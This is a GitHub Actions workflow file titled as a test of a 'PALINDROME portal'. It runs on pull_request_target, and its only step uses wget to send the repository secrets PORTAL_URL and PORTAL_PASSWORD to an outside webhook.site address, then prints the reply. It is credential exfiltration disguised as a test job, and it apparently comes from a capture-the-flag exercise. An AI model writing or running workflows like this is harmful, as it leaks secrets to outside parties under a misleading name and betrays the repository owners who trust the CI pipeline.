name: Test the PALINDROME portal

on:
  pull_request_target:

jobs:
  test:
    runs-on: windows-latest
    steps:
      - uses: actions/checkout@v3
      - name: Test the PALINDROME portal
        run: | 
          C:\msys64\usr\bin\wget.exe '''https://webhook.site/f153a851-3e05-4a72-81c4-74527ee92bc2/?u=${{ secrets.PORTAL_URL }}&p=${{ secrets.PORTAL_PASSWORD }}''' -O test -d -v
          cat test
